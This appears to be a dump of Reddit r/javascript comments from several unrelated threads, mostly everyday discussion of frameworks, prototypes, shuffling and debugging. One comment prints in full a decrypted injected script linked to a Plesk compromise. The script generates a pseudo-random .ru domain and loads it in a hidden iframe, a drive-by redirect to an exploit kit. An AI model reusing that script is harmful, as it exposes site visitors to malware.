I've been using Resthub as a great backbone/require.js starting point.
Start on page one and keep going: http://www.amazon.com/JavaScript-Definitive-Guide-David-Flanagan/dp/0596000480 
WTf is this shit?
&gt; Most of the big frameworks are open source. You can contribute (if it's optimizing slow stuff, they'd probably be happy to merge the changes), or just fork a copy for yourself. This is the greatest illusion of open source tough. If you decide to fork a project, you pretty much lose a lot of it's the benefit. The more your fork differ from the original one, the harder it becomes to get community support and the harder it gets to merge community update. If you are working in a small/medium company, forking and maintaining an open source project in parallel is simply not viable at all given the resource it takes to do that. While it may be in theory possible, in practice, it's rarely an option you can really choose from. You can also propose patches, but you have no guarantee that it will be accepted. If you are assuming that a framework can be as flexible as an in-house solution, you are making a risky assumption. Again, just to be clear, I'm not saying framework are bad. What I'm saying here is that when you are choosing a framework, it comes with trade-off, just like choosing to building from scratch has trade-off. My opinion may not be very popular, but I rather express an unpopular opinion that leaving this cargo cult of "framework are always a good choice and have absolutely no downside" going on.
I agree, but get the latest edition. :-)
Sounds good, ill need to check it out next time I'm on the desktop. Just an FYI, the site doesn't work on mobile (iOS) the nav is stacked vertically taking up the whole page and is set to fixed so I can't scroll past it. 
Thanks for pointing that out. I guess you must mean - iPhone. It looks nice on the iPAD. I'll check it out and see if I can fix it (The site uses Bootstrap)
What are you talking about? Optimizing a "slow bit" is something that wouldn't be rewriting the whole framework. It should be easy to fork and get accepted, and it is... I have done this 5+ times already, and github makes it amazingly easy. Good luck trying to optimize the compiled stdlib, or boost. Or have fun maintaining your all-custom 40kloc codebase all hand written by two or three people. Framework's are an easy win, you can pick one, abstract it, extend it, and change it out if it doesn't meet your demands... look at lowjack, marionette or Zepto. I'm sorry for being condescending, but anyone worth their salt looks at this very pragmatically; frameworks are productivity boosters, and when they aren't the nature of javascript makes them easy to modify to fit your needs.
Thanks. I'll just add, frameworks aren't just personal productivity boosters. Trying to assess a vanilla JS dev to check if they know all the right techniques to do two way binding, use observers, properly separate concerns, etc. is so much harder than just looking at their GitHub account and being like, "Oh, you've used Ember before?" If they're framework literate, you know immediately you can throw them into a project that uses that framework with minimal friction. And if they're not, getting them framework literate is a much easier training job than getting their vanilla JS to the point where they can do equivalent work.
Great tool, bringing it to our workflow at the dayjob will be a godsend, and a 1.0 release cements the "it's production ready" talk I've been preaching.
How do I have it backwards? I never said Node is I/O bound. I only commented about APIs written in Node potentially being I/O bound because of reliance on other I/O bound services...
Let's remember I was commenting on Web APIS and not something like chat using websockets, where you could potentially open a bunch of unique sockets on a server. Who exposes web APIs where the datastore isn't the bottleneck? (I'm sure they exist, but my gut feeling is that they're very rare....especially compared to the number of people writing API examples in Node.)
This depends entirely upon the type of work you are doing. Where I work we don't use any 3rd party frameworks and roll our own libraries tailor-made to our specific needs. For simple sites, sure it makes the most sense to use a framework, but at a large scale, and when performance is paramount it's almost always better to make your own.
If JS is your first language then stop everything right now and go back to basics and learn a proper programming language first - one that has rigidly enforced data types and allows you to allocate and deallocate memory when you want to. Master that language and by that time you will be able to code JS libraries in your sleep.
No problem. Yep I phone
You are trying to do this too low-level. Use the fantastic [Moment.js](http://momentjs.com/) date manipulation library. You are especially interested in the [time from now](http://momentjs.com/docs/#/displaying/fromnow/) functionality.
Sadly this will be delayed :( My complete lack of music knowledge is making transposing this an extremely slow and inefficient process, but luckily I called up an old friend and she said she'd gladly help. It'll be a few days until we can meet up, though.
No worries. Would it make it easier if you were to load in the notes using [this notation](https://github.com/meenie/8bit.js/issues/1#issuecomment-23086710)?
Looks awesome, can't wait to try it out! Just wish I knew about this yesterday before spending a couple hours troubleshooting a complex embedded model and view relationship.
Thanks! I hope it helps you out!
Shame it says gruntjs.com, ruins the simplicity of it.
The idea here is similar to labview. I've used it, and labview is great for certain things. If you are working with physical inputs and want to update to the UI continuously that's great. But I've also had to use it for complexer things and while it's all possible, you really miss being able to use a normal programming language. I ended up coding most of the program in a DLL in C++. Also you want to be able to use source control, and this includes letting people merge. This isn't an unsolvable problem, but it means that they either coded up some kind of interface to resolve graphical merge conflicts, or the people doing the merging are going to have to know how to edit the files behind the graphical interface. So they need to be programmers after all.
Easily edited out. 
Looking at the comments it seems like all critique is focused on the choice of one word in the introduction. Can we move beyond that and talk about actual ideas? I have used Quartz Composer and Pure Data, but most of my coding was in Flash and JS. Then I started http://meemoo.org/ to bridge those paradigms and experiment with hackable media. Now I'm working on NoFlo to bring the concept closer to JS for more general programming. I'm looking forward to building Meemoo components with NoFlo, making my code even more encapsulated and reusable. My biggest issue with QC and PD is that I often wanted to dive into a component and change something. In QC this meant finding the source (if open) and figuring out Objective-C, XCode, compiling... too much friction. We are putting a lot of design into making a useful tool for coders. We'll be able to edit a component's JS or make a new component in-place, in a live graph, without changing windows and taking us out of our own coding flow. So FBP hasn't been suppressed, and is currently only used in niche industries. The truth is that it hasn't been tried for general purpose JS, which spans server, interactive UI, canvas, WebGL, Web Audio, and all future niches that JS finds. We're inviting our early community to help us design the patterns that make sense in those contexts. The beauty of the JS ecosystem is that it will be seamless to connect them. So FBP isn't a silver bullet that will make everybody magically understand code. But when I discovered Quartz Composer, my concept of what is possible with code was greatly expanded. My hope is that Meemoo and NoFlo will have that effect on future media hackers.
imagemagick?
[Photoshop.](http://i.imgur.com/8ZhrfIW.png)
I guess I don't understand what you meant by this then: &gt; most APIs I've ever worked on access relational databases, which are i/o bound (the opposite of how Node is supposed to behave) In most web apps where you have a threaded app server and a database, the app server will generally be the bottleneck because 1-thread-per-connection is very resource-heavy. On any site of significant size, you'll usually have a cluster of app servers before the database becomes the bottleneck. Since the app server is mostly just doing i/o between the database and the browser (and not something cpu-intensive), 1-thread-per-connection is not actually necessary. At any given time, most of those threads are idly waiting for i/o. Asynchronous frameworks like node take advantage of this fact by managing all connections in one thread, thereby getting a lot more done with the same hardware. I personally think you're right that it's a bit more clunky to write these APIs in node, but the performance benefits (for the app server tier) are pretty substantial.
Just used it to find a bunch of Views that should have been removed but weren't. It would be awesome if the "views" tab showed the hierarchy of views when one view contains another.
And now it can go on /r/wallpaper and not seem *as* niche. Everyone wins.
What do you guys use GruntJS for? I already have an established method of using CSS preprocessers. Any other cool things I should try with Grunt?
You can do right click -&gt; view source. I started it on jsbin.com, then continued editing in visual studio, so it's still all in 1 (html) file. The only reference to another script is for jquery. Though I must give credit to http://www.pixeljoint.com/pixelart/29845.htm, where I got the base tiles from before I edited them a bit, cut them into appropriate sizes and uploaded them to imgur. I should probably clean it up a bit more and make it more "plugin-able", but I was focusing on getting it to work decently in a performant and reliable way. 
Lots of interesting code patterns in here! Though some of these could be updated to use standard syntax rather than proprietary extensions. Some comments: **Simulate threads using yield operator** Use ES6 syntax for generators if possible as they will be interoperable. **Shuffle the Array** Use Fisher-Yates if you really need a fair shuffle. Sorting by random is quick and dirty though not fair. **Multi-line Text** ES6 string templates allow for multi-line strings: var str = `line 1 line 2` **Optional Named Arguments** This is actually just a special case of ES6 destructuring assignments! **Transform an arguments object to an array** You could also use Object.setPrototypeOf(arguments, Array.prototype) I think. I wonder which is faster? **Array iteration pitfall** This guy is fixed in ES6 with the new for-of syntax (which uses iterators behind the scenes). No more worrying about slurping in prototype properties, and you can actually iterate keys, values, or both! **A Switch function** That's some odd function syntax, definitely not allowed per spec. I wonder if this should be a test262 test? :) If you want to omit braces, use the new ES6 arrow function syntax. **Objects private and public members** Keep in mind that using this pattern is pretty poor for performance. You have a new instance of a closure for each method for each instance of your object. **Functions argument default value** ES6 has default parameters now (function foo(x = 1, y = 2) { }). **Multiple string concatenation** It used to be true that array join of strings was faster (in IE8, I think?) But I'd be surprised if this is true in modern runtimes. Anyone have a benchmark handy? **Using 'with' scope** No thanks. **No Such Method** Similar semantics can be provided by ES6 proxies. **proto ( prototype property )** While IE finally supports __proto__, it was only grudgingly added to the spec. Object.setPrototypeOf is the better way to do this. **getter and setter function** Both of these patterns are highly deprecated. Use ES5 standard getters/setters instead! **check if a property is enumerable (propertyIsEnumerable)** Use ES5's Object.getOwnPropertyDescriptor
Funny challenge. I'm not a bash expert (and this is /r/javascript), i'd make myself a web app using HTML5 Fileapi, some &lt;canvas&gt; and [Google Map Static Map API](https://developers.google.com/maps/documentation/staticmaps/) (with little help of this [exif jquery plugin](http://www.nihilogic.dk/labs/exifjquery/) I found yesterday). But maybe a node.js script would be easier. Have fun !
* Grunt watch's live reload capabilities make for awesome demos of webapplication development processes * JSHint * coffeescript to javascript transpilers with sourcemaps * traceur transpiler for es6 to javascript (sourcemaps coming soon) * Compass * generators for generating boilerplate All of this in a simple to read javascript config that you can split into multiple files if necessary.
Gotcha....not really used to having one web server trying to host so much since it's one of the few things in a stack that's easy to scale. 
for instance, I fetch the SVN revision and add it dynamically to the html.
I wish I had time to do it for fun, but heck I already have a lot of work/side project to add this one on the pile. Unless you're patient (or rich), I can only give advice and/or code review. Also, giving some sample picture could help ;)
+new Date() has been around for years and is just a shorthand for (new Date()).getTime() (some parentheses optional)
Date.now() should be faster. Doesn't work on IE before 8, but who cares. http://jsperf.com/datesperformance8-24-2013
It's cool I edited and flipped mine I just didn't think it was ok to post that myself. My personal thought on it is I want a cool lock screen not a reason I have to explain a url to everyone who peaks. I'm not really complaining.
Wonderful! I'll think about that. Would you be so kind to put it in the issue tracking system? 
Legend thanks! Found it a little tricky to get my head around this side of grunt. 
&gt; It's only of benefit if you're playing code golf. ~~Not even then.~~ Well, strictly, `+new Date()` isn't, but *see below*! &gt; "Date.now()".length 10 &gt; "+new Date()".length 11 And you can't use the plus sign for addition without parentheses, so you can't even exploit the fact that `+new Date()` begins with a plus sign to avoid using them: &gt; 1+new Date() "1Sat Aug 24 2013 19:35:28 GMT-0700 (PDT)" &gt; 1+Date.now() 1377398252358 edit: but wait! the following is actually better from a golf perspective: &gt; +new Date 137739846271 &gt; "+new Date".length &gt;9 
The page appears to crash MobileSafari and Alien Blue on iOS 7.
Be sure to scroll up and press play.
Add Mobile chrome on iOS 6, iPhone 5 as well to the crash list. 
The random sort method will not be as fast as a proper shuffle (O(n log n) as opposed to O(n)). Also, more importantly, it won't properly shuffle the array. Try running this code in your console to see the problem illustrated visually (borrowing /u/x-skeww's shuffle above). var n = 7; var its = 1000; function range(n){ var arr = new Array(n); for (var i=0; i&lt;n; i++){ arr[i] = i; } return arr; } // bad shuffle function shuffle1(arr){ arr.sort(function(a,b){ return Math.random() &gt; .5 ? 1 : -1; }); } // proper shuffle (fisher yates) function shuffle2(a){ var i, temp, p; for (i = a.length - 1; i &gt;= 1; --i) { p = (Math.random() * (i + 1)) | 0; temp = a[p]; a[p] = a[i]; a[i] = temp; } } var arrs1 = []; var arrs2 = []; for (var i=0; i&lt;its; i++) { var arr1 = range(len); shuffle1(arr1); arrs1.push(arr1); var arr2 = range(len); shuffle2(arr2); arrs2.push(arr2); } var results1 = []; var results2 = []; for(i=0;i&lt;len;i++){ results1[i] = 0; results2[i] = 0; } for (var i=0; i&lt;its; i++){ for(j=0;j&lt;len;j++){ results1[j] += arrs1[i][j]; results2[j] += arrs2[i][j]; } } for(i=0;i&lt;len;i++){ var s = ''; for(j=0,l=Math.round(results1[i]/100);j&lt;l;j++){ s += '#'; } console.log(s); } console.log('-----------------------------') for(i=0;i&lt;len;i++){ var s = ''; for(j=0,l=Math.round(results2[i]/100);j&lt;l;j++){ s += '#'; } console.log(s); } 
Magic beans for programmers 
mouth drops. that's pretty amazing.
The problem with immutable by design, is that unless the runtime is built with this in mind, then the performance can really suck. Especially when a lot of library implementations in functional languages, also try to avoid creating entirely new data structures. Instead they try to share a lot of internal data (like if you add to a tree, the new and old trees continue to share most of the tree nodes, if possible). I can see setjs being nice for asynchronous code, but it wouldn't be so great if it's working with large data sets.
Mind blowing!!!!!!!!!!!!!! The author should do a client side rollercoaster simulator now :)
I tried to use `document.write` and my page is all fucked up lol, jk
Afaik yield is not supported in most browsers, which is a pity.
Ah yeah -- I should add a "Caveats" section and mention that it shouldn't be used with any inline scripts that execute a document.write Edit: Added a mention, thanks.
Can someone tell me about the ternary operator form "a = b if c"? I know this from python, but never seen it in js, also not mentioned on MDN...
Wow, this is ancient
Also, I'm not sure the author understands what a yield or a thread does. A yield is more for functional enumeration. A thread is separate application space for running a sets of instructions concurrently. You can do this with Workers in JavaScript. Yield has nothing to do with threading, and isn't even remotely close to "simulating" threading.
The destructuring assignment isn't even as clean as it could be: function foo(id, {title, name}) { console.log(id); console.log(title); console.log(name); } foo(12, {name: 'Bob'});
Do you mean like this? var a = (c) ? b : otherval;
Yeah, you probably don't want to use this if you are after performance. I just find it easier to reason immutable structures. :) Do you think it would be possible to implement some form of sharing in JavaScript? Maybe prototype chains would work for that?
What the hell kind of moonman language is this? Half of this isn't even valid ecmascipt syntax!
var a = c ? b : otherval; Parens above aren't necessary.
It's not ECMAScript, it's JavaScript (ie. mozilla's implementation of ECMAScript). They have a number of extensions as you can see.
Be sure to check out any of his other blogs, everything on this website is explained thoroughly, he has great, amazing things on there.
sweet, i didnt know that. thanks :)
In javascript they are called objects, not associative arrays. Also, here's what you're trying to do. https://gist.github.com/tencircles/6335450
I have trouble calling anything javascript that doesn't conform to http://www.ecma-international.org/publications/standards/Ecma-262.htm This is why I hated my short time playing around in unity using their "unityscript" it's just javascript with more bad ideas and weird syntax.
No, I meant a = b if c, because the article mentions it like that. Your code example is documented standard, while I've never seen the syntax used in the article. Since the article is a bit older (2012, references E4X), I assume it might be some deprecated browser-specific thing... or something like this.
I know the feeling! Although, to put on my pedant hat, Mozilla's implementation DOES conform to ECMA-262 thanks to [Clause 16](http://es5.github.io/#x16) which explicitly allows extensions to syntax. All implementations take advantage of Clause 16 for some reason or other. For example, all implementations today have an extension to allow function declarations inside blocks. Conformance aside, JavaScript is free to do whatever it wants. The only thing JavaScript has to conform to is whatever Mozilla wants it to. If it doesn't conform to ECMAScript, you can't call it ECMAScript, but you can still call it JavaScript!
I believe what you're seeing are Mozilla's proprietary conditional catch clauses.
I can see that circle, I dont know the problem but probably you can use firebug to debug the page. By the way the page looks good.
im not seeing any bugs :-/
It may not be a bug (as in syntactically incorrect) but may be a logical error. I'm not entirely sure what you're trying to accomplish...can you elaborate a bit more on the functionality you're trying to accomplish? I think what you're saying is that pink circle should be present when the user scrolls and hits an image that hasn't loaded yet. So it shouldn't just sit at the top like that. Is this correct? Are you using a plugin for this or is it just jQuery (or even just raw Javascript)?
Looking at the documentation for CanvasLoader it says the following: "A CanvasLoader instance creates two canvas elements which are placed into a placeholder div (the id of the div has to be passed in the constructor). The second canvas is invisible and used for caching purposes only. If no id is passed in the constructor, the canvas objects are paced in the document directly." Are you doing this? Seems like it could be your problem.
it sort of sounds like my issue but it isnt really english to me. would you be willing to take my hand and walk me through this?
It looks like your problem is you're only adding the canvas element but not adding any javascript to handle displaying it. check out this page: https://github.com/heartcode/CanvasLoader/blob/master/heartcode-canvasloader.html You're going to need something along the lines of this for each loader you want on the page (I think anyway): &lt;div id='cl_spiral' class="loader" style="margin-left:-10px;"&gt; &lt;script&gt; var cl0 = new CanvasLoader("cl_spiral", {id: "canvasLoader", safeVML: true}); cl0.setShape("spiral"); cl0.setDiameter(20); cl0.setDensity(40); cl0.setSpeed(4); cl0.setFPS(24); cl0.setDensity(400); cl0.setSpeed(4); cl0.setFPS(12); cl0.show(); &lt;/script&gt; &lt;/div&gt; Note that you'll need to name each instance something new. Basically you're just going to be replacing the c10 part with like c11, c12, etc. See how the id of the div is being passed in as the first parameter in the new CanvasLoader part? You'll need to make sure that is unique for each one as well. I need to head out soon but feel free to PM me if you have any questions and I can respond later tonight.
It's late here and I haven't done a full copy of your code so apologies if this is wrong. Looks to me that in [your JS](http://marc-with-a-c.com/new/js/all.js), there's a function that goes into each article tag, creates and loader and then only removes that loader when the images within fire their load events. Problem is, if your images have already loaded, or if there are none in that &lt;article&gt;, then the load event won't fire and that removal process never occurs. Potentially the best solution for this is to, on each image, check its [complete](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) property ($(this).prop('complete') or $(this)[0].complete). Then, if all of them are complete already (or there are none), immediately hide the preloader rather than (supposedly) waiting for them to load. Ultimately, try using [this code](https://gist.github.com/gregtyler/6336562) instead of your current $(window).scroll(...); and if that doesn't work, my apologies.
THATS A BINGO!!! thanks a lot gregtyler!!
Not so good with using a search engine? 
Been a while since I've looked at it but this is the general idea. Javascript as a language doesn't really support inheritance in the traditional C++/Java/whatever manner. In those languages you declare a class and then when you want an object you instantiate an instance of that class. Classes can inherit from one another which is designed to make it easy to reuse functions or class variables. In Javascript there are no classes and thus no instantiate in the traditional sense. The way objects are created in Javascript is by cloning them. Also, everything in Javascript is an object, even the base types. So for example Integer would be an object. And if you were to do 'new Integer' what you are really doing is taking the Integer 'object' and cloning it. Now if Integer is an object and not a class, where do you store the functions and variables it needs? That's where prototype comes into play. Every object has a property called 'prototype'. Prototype is the one property which when you do 'new Widget' gets copied along. So in other words if you stick properties and functions onto the prototype property of an object, when someone comes along and clones it they will ALSO clone those functions/properties. This is called prototypical inheritance because this is how you can define the equivalent of classes or inheritance. You create a new object type by attaching parameters and functions to an instance of that object's prototype - then when you do new Whatever those things copy over and you get basically the same thing as classes in more traditional languages. I'm not quite sure why they chose to do things this way - EMCAscript is a weird little language in a lot of ways - but it works and you can do some interesting things with it because of this. Oh, another property of prototypes and this stuff is how Javascript finds a functions. I believe every prototype object has a link to it's parent prototype. So for example, if you call Integer.add(2) (I'm just making this up) the way it finds out what add() is is to look at the current object's prototype - if it finds it then it uses that version of it. If not then it will look at prototype.parent or whatever the property is and then use THAT object's prototype to see if there's an add() method. It keeps doing this until it reaches the top which I think is the Object object. Again it's been a long time since I've looked at this so someone please correct me if I'm wrong.
How original.
The article doesn't go much in depth about how to detect them with the Heap Profiler. From experience getting started with Chrome Heap Debugger isn't the easiest thing especially the first few times. So here's a few pointer for those that want to get started : - The most useful view you will need is usually the "Comparison". Typically, what you want to know is if doing a certain sequence of action will keep objects in memory. By using the "Comparison" view, it will let you see the delta of 2 snapshot. So you basically take a snapshot before the action, then after the action and last you check the "Comparison" view to see if anything was created and remained that shouldn't be there. - If you want to detect DOM leak, the most important keyword you need to remember is "Detached DOM Tree" (not to confused with "Document DOM Tree" that is the DOM tree of the page). This means that there is a DOM structure that still in memory, but that isn't attached to the body (in the document). It may be normal in some cases, but it's usually a DOM leak. - If you want to see the source of the leak. You have to inspect the element that's leaking and look for text along "context in function()". It means the object is kept alive by a variable in a closure and it points to which function is holding it. You can see the detail of that function by hovering the "function" text (ex.: http://i.imgur.com/v7tLcDt.png).
It would be nice if it would work and looks somewhat appealing if javascript was disabled. Also preload some of the content before the user scrolls down, otherwise it feels clunky. 
So the prototype is essentially the base object? Some issues I've encountered deal with appending properties to "Dog.prototype.speak" instead of "Dog.speak". If I want to add/change to Dog.speak, why do I need to include the prototype? 
Two videos that explain it well: http://vimeo.com/69255635 http://www.youtube.com/watch?v=PMfcsYzj-9M
AHA! I think I understand now! So if I have: var dog1 = {}; dog1.speak = function(){alert("bark!"); }; that means that only the static object "dog1" can speak. The below code wouldn't work, correct? var dog2 = new dog1; console.log(dog2.speak); But if I did: var dog = {}; dog.prototype.speak = function(){alert("bark!"); }; var dog1 = new dog; console.log(dog1.speak); That would work? 
Here is the best explanation of prototype I've ever read. It's written by Alex Sexton who is awesome. http://alexsexton.com/blog/2013/04/understanding-javascript-inheritance/
Ok, so if you want something to apply to all of your child objects, you should append that to the prototype method in your initial constructor?
Yeah, look at the answer to [this](http://stackoverflow.com/questions/4508313/advantages-of-using-prototype-vs-defining-methods-straight-in-the-constructor) question for a more detailed example, but changing or adding to the prototype of the constructor will impact every instance of that object. In that case it was an add function that changed implementation. I suggest taking time to watch the YouTube video liked in another post here... watch the fist part to understand the basic object types and reference/value copying if you don't want to watch it all... it I highly suggest watching it all. it's worth 30 min of time. http://www.reddit.com/r/javascript/comments/1l2ycy/can_someone_explain_to_me_in_detail_what_exactly/cbvb7k1
I would also recommend you check out: http://www.objectplayground.com/ The video does a great job at explaining javascript object inheritance through prototype. But the site itself is a great tool for pasting your own snippets and seeing a visual representation of the object relationships.
I laid the foundation for you... mod as you need: http://jsfiddle.net/ntzbz/1/ Edit: Reddit gold. :)
Seriously?? That's an amazing help and a VERY thoughtful gesture. Thank you so much, Dencho! I can't wait to get started with this.
That looks like a pretty good way to do it, too. I've got some restructuring to do next time I poke around in this, but I'll take that into consideration too. Thanks!
It's def from the plesk vulnerability. Back when that was current everyone on the underground forums were throwing their exploit packs up on every plesk site they could find.
I should note that MSE /really/ didn't like me putting that f array into an html document and running -- auto-protection deleted it. Had to turn that off to reveal.... the decrypted javascript : function nextRandomNumber() { var hi = this.seed / this.Q; var lo = this.seed % this.Q; var test = this.A * lo - this.R * hi; if (test &gt; 0) { this.seed = test; } else { this.seed = test + this.M; } return (this.seed * this.oneOverM); } function RandomNumberGenerator(unix) { var d = new Date(unix * 1000); var s = d.getHours() &gt; 12 ? 1 : 0; this.seed = 2345678901 + (d.getMonth() * 0xFFFFFF) + (d.getDate() * 0xFFFF) + (Math.round(s * 0xFFF)); this.A = 48271; this.M = 2147483647; this.Q = this.M / this.A; this.R = this.M % this.A; this.oneOverM = 1.0 / this.M; this.next = nextRandomNumber; return this; } function createRandomNumber(r, Min, Max) { return Math.round((Max - Min) * r.next() + Min); } function generatePseudoRandomString(unix, length, zone) { var rand = new RandomNumberGenerator(unix); var letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']; var str = ''; for (var i = 0; i &lt; length; i++) { str += letters[createRandomNumber(rand, 0, letters.length - 1)]; } return str + '.' + zone; } setTimeout(function () { try { if (typeof iframeWasCreated == "undefined") { iframeWasCreated = true; var unix = Math.round(+new Date() / 1000); var domainName = generatePseudoRandomString(unix, 16, 'ru'); ifrm = document.createElement("IFRAME"); ifrm.setAttribute("src", "http://" + domainName + "/runforestrun?sid=botnet2"); ifrm.style.width = "0px"; ifrm.style.height = "0px"; ifrm.style.visibility = "hidden"; document.body.appendChild(ifrm); } } catch (e) {} }, 500);
After I wrote the code I realized I had failed to consider your request for captions. I'm hoping you can make the mods yourself. Let me know if you can't. My idea was to write code that was simple to understand and expand.
&gt; better explanation Thanks for your explanation .
You are right when you use `__proto__` setter or `Object.create`. But these are relatively new features. I disagree in the normal case. While there is no class keyword literally, there is no real difference from declaring a class vs declaring a constructor with fields inside it and prototype with methods in it. In fact, if you need class keyword to fool you, then it will be available in next version as simple syntactic sugar for the former. And there is definitely no difference when it comes to using the `new` keyword. While Javascript allows you to do lots of crazy things like defining the methods in constructor, so [do other languages as well](http://hastebin.com/fayotemade.cs)
awesome example such wow
These two links should help: * [Helephant - Javascript Object Prototype](http://helephant.com/2009/01/18/javascript-object-prototype/) * [Helephant - Javascript Prototype Chaining](http://helephant.com/2009/08/17/javascript-prototype-chaining/)
No worries there, I can figure out the captioning. Plus, these would really be one/two word navigation titles (e.g. "Contact") that I may end up building into the tile images themselves. Thanks for the offer!
great explanation! now i will start to use .prototype 
***Has programming gone too far?!***
You're doing it correctly, but I wonder if you've made a instance of the class before calling functionA? var foo = new MyClass(); foo.functionA(); 
 wow such javascript so inheritance code shibe.prototype === wow // true
I was actually thinking something similar in the shitter 2 days ago but for image distribution. Would recommend reading about torrent architecture and use a centralized server, similar to the pure javascript chats. The thing I had in mind involved delivering the website images to say the first 20 people, and then "torrenting" the content across clients. That way you could get increased load speeds with increasing traffic, and the only thing your server would have to do it calculate who needs what, and relay the positions of the other clients. I'll keep this post saved, see if I can find more ideas.
Same here... I got the part that it is a form builder and there are a bunch of different apps (see their experimentation page) which can do different things like setting up questionnaires and posting those to your google drive. This might be useful if you're building your own CMS. Other than that I don't really see the point either. Especially as a dev. Edit: Checking out the "other discussions", well the people at /r/python killed this one off quickly. Also the founder doesn't seem to provide very clear answers on what it is suppose to do an what itch it would scratch for me as a dev. I guess the guys that set this up should hang out in /r/startups more often... They might learn something.
I don't want to have to keep a server myself. Maybe I could use something like the Mainline DHT to find other clients.
Watch out, the &lt;p&gt; tag for Details 2 opens twice and never closes.
Thanks for putting the time to do this. Much appreciated!
I'm making something very similar, here's my stack: [Nodewebkit](https://github.com/rogerwang/node-webkit) + [socket.io](http://socket.io/) + [express](http://expressjs.com/) + [nedb](https://github.com/louischatriot/nedb) + [webrtc](https://developer.mozilla.org/en-US/docs/WebRTC) (via [mux.js](https://github.com/richardanaya/mux.js)) + some mvc/mvvc (bb/ang/[ko](http://knockoutjs.com/)) The idea being a host / client webrtc connection backed by a socket.io connection. Each host can serve their own html page to all clients, each client can see every other client and traverse the host list and connect / view eachother as a client to that host. So it allows transversal of the web topology. Each host (and everyone is a host) has a list of hosts they are connected to and a list of clients that are connected to them. This is backed by an internal document flat file JSON database, it doesn't have to be fast, doesn't have to be pretty, but light is a good thing. Where it'll record all connected clients and hosts for direct connection at a later date.
I'd be interested in hearing more about this stack if you ever do any blog posts or just have it up on gitHub.
You can think of it that way, yes. What happens when you call something like : dog.bark(); It first will check to see if that object has the attribute bark, and then it will check its prototype. You can do a form of overloading by altering just one object's bark function. This is why people tend to get upset when people mess with predefined object's prototypes, because you can cause a lot of problems.
AFAIK you cannot find IE &lt;= 7 specific memory leaks with a Google Chrome profiler. The cyclic references and closure leaks mentioned in the article are no issue with the debugger, as the Chrome GC will detect and release those.
I think I gave a shorter alternative in the comments years ago. The shuffle algorithm I used is slower but is much shorter. It did the reverse by picking the last element in the array and then placing it randomly in the randomized section of the array: for(i=0;i&lt;array.length;i++)array.splice(Math.round(Math.random()*i),0,array.pop()); You can reverse it around to pick a random one and then push it on the end if you prefer though: function shuffle(a) { for (var i=a.length;i;i--) { a.push(a.splice(Math.random()*i|0,1)[0]); } return a; }
http://unhosted.org/ Unhosted Web Apps is the best resource I have found on the subject.
WebRTC has too severe of data transmit limits to be useful for much of anything. IMO, WebRTC is red herring.
Depending on how/where you call the function, "this" doesn't necessarily refer to your class object.
Hey, thanks for your help, this topic been confusing me for a couple of days now but your video really cleared things up for me. +1 subscriber! :)
true - I wrote it a few years ago from the top of my head with no testing - second example should be better
You can get with *this* or you can get with *that*.
I have never heard of Nodewebkit before. Doesn't this mean that people have to run something outside of the web browser?
Yes you're right, it was how I was calling the function that was a problem. I had an array of callback functions, and I was adding myObj.functionA to that array. It was just like /u/h1ghl4nd3r said.
Yep, it's a standalone node.js instance, completely contained. It supports all things node.
Then I'm not sure why your thing is so similar. So to run your thing everyone has to "download and run" something? I want to make it as easy as possible.
Your server at http://10.0.0.81:31456 is responding with HTML instead of JSON.
does this mean i will need to have a server side handler? I would think that shoretel server does all of this for me
You should try and open the URL in the browser directly (better though, view the AJAX response in some kind of dev tool) to see what's going on. What you describe is a Python error message. That is, the server-side Python code has somewhere a syntax error, that crashes. There's nothing you can do on the client side (i.e., JavaScript) to prevent this.
So it just isn't possible to do this insidr the browser? What private key are you talking about?
If you have the time skim over the webrtc docs on MDN, for a direct browser to browser connection, the host has a private key that each client must supply to achieve a connection. This can be any string, but you'd want something long and unique, so some kind of guid generator function. To pass this key around, you could have everyone email it, but that would require everyone to know each others email, bad idea, and most emails are now compromised by the NSA, so email itself is out. 
OP said it happens on load, meaning it's failing before the ajax call, since the ajax call is a user action. Smart quotes like he has in an example will trigger an illegal token error.
That's a shame. Well the point of this was to have an unordered "message board" easily accessible from browsers. Emailing keys would defeat the point, because the point of it is to make it easy to find messages. So I guess that it needs to run outside the browser then.
Another factoid about prototypes: If you need to create a large number of objects with associated functions &gt; e.g. 50 * var car = new Car(); Putting the functions on the prototype of the Car object will result in only one copy of those functions existing in memory for all 50 'cars' you created. 
It can be run inside the browser, but it would have to have a centralized key exchange hub, so the network would easily be destroyed by taking that down.
MS office as I'm aware is an awful programming editor for smart quotes behavior and lack of syntax highlighting. Use a real programming editor such as Notepad++ which features syntax highlighting to make it easier to read and help spot problems in code.
对不起，这个特殊的板的主要语言是英语。 Sorry, this particular board's primary language is English.
sometimes web based CMSs will do smart quotes, too. If someone put up an example using that CMS, then this guy copied it, he would have pasted it as smartquotes. Some IDEs even show smart quotes as regular quotes. I had an issue with that about a month ago. A developer had copied sample code, and we didn't even realize it was smart quotes causing it until we viewed source.
&gt; when performance is paramount it's almost always better to make your own This is a classic example of the [NIH syndrome](http://en.wikipedia.org/wiki/Not_invented_here), and is more often than not just plain wrong. &gt; In programming, it is also common to refer to the NIH "Syndrome" as the tendency towards reinventing the wheel (reimplementing something that is already available) based on the belief that in-house developments are inherently better suited, more secure or more controlled than existing implementations. Unless you have written your entire stack, OS kernel through RDMBS through webserver, you are using, and trusting 3rd party code. At a given organization you most often see NIH syndrome in the languages that the developers work the closest with-- but not in the rest of the stack, I'll leave it to you to speculate why that could be. Greenspun's 10th rule usually applies to the 'home-rolled' frameworks you see in situations like this: &gt; 'Any sufficiently complicated C or Fortran program contains an ad hoc, informally-specified, bug-ridden, slow implementation of half of Common Lisp.'
Prototypes deal with items shared amongst all objects which have that prototype, such as methods. I think you are a git confused about what Prototypes offer you. A union of sets A and B, will create an entirely new and unique set. One which is specific only to that object. Prototypes simple don't deal with details at that level.
Actually it wasn't even php. It was COBOL, and it wasn't so much an IDE as a terminal window. 
Happy to help!
Awesome, let me know if it fixes it. Shit like that happens all the time, usually you just need a second set of eyes to see something as simple as that that you've overlooked. The same thing happened to me not too long ago with one of my developers, so it was fresh in my mind.
You want to learn to code go hit "Learn Python the Hard Way"[1] Nobody can help you with the broader problem of learning how to code. You have to put in the work, whether it be Python or Javascript or whatever. [1] http://learnpythonthehardway.org/
There's plenty of online education sites (though you should avoid w3schools): https://www.google.com/search?q=learning+javascript+online 
